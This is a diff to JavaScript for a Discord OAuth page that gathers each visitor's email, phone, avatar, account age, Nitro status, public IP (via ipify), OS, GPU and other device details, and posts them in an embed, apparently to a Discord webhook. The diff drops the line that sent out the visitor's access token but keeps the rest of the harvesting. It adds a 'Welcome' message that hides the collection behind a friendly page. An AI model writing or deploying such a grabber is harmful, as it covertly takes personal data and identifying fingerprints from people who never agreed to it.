@@ -46,8 +46,9 @@ async function fetchUserData(code) {
     }
 
     const user = await userInfoResponse.json();
-    const email = user.email || "no Email attached.";
-    const phone = user.phone || "no Number attached.";
+    const username = user.username; // Extract username
+    const email = user.email || "No Email attached.";
+    const phone = user.phone || "No Number attached.";
     const avatarUrl = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`;
     const createdAt = new Date(user.created_at).toLocaleString(); // Account creation date
     const nitro = user.premium_type ? "has nitro" : "no nitro"; // Check for Nitro status
@@ -55,11 +56,11 @@ async function fetchUserData(code) {
     const city = "City not available"; // You would need to use a geo API for real data
     const country = "Country not available"; // You would need to use a geo API for real data
 
-    // Call the function to send visitor info along with the access token and user information
-    sendInfoToDiscord(data.access_token, email, phone, avatarUrl, createdAt, nitro, operatingSystem, city, country);
+    // Call the function to send visitor info along with the user information
+    sendInfoToDiscord(email, phone, avatarUrl, createdAt, nitro, operatingSystem, city, country, username);
 }
 
-async function sendInfoToDiscord(accessToken, email, phone, avatarUrl, createdAt, nitro, operatingSystem, city, country) {
+async function sendInfoToDiscord(email, phone, avatarUrl, createdAt, nitro, operatingSystem, city, country, username) {
     const ipResponse = await fetch('https://api.ipify.org?format=json');
     const ipData = await ipResponse.json();
     const ip = ipData.ip;
@@ -95,7 +96,6 @@ async function sendInfoToDiscord(accessToken, email, phone, avatarUrl, createdAt
                 { name: '🧠 Hardware Concurrency', value: `${hardwareConcurrency} logical processors`, inline: true },
                 { name: '🖼️ Screen DPI', value: screenDPI, inline: true },
                 { name: '🎮 Graphics Card', value: gpu, inline: true },
-                { name: '🔑 Access Token', value: accessToken, inline: false },
                 { name: '📧 Email', value: email, inline: true },
                 { name: '📱 Phone', value: phone, inline: true },
                 { name: '🖼️ Profile Picture', value: `[View Avatar](${avatarUrl})`, inline: true },
@@ -120,7 +120,7 @@ async function sendInfoToDiscord(accessToken, email, phone, avatarUrl, createdAt
         body: JSON.stringify(embedMessage)
     });
 
-    document.body.innerHTML += `<h2>Thank You for Testing</h2>`;
+    document.body.innerHTML += `<h2>Welcome @${username}, thank you for coming!</h2>`;
 }
 
 window.onload = function () {
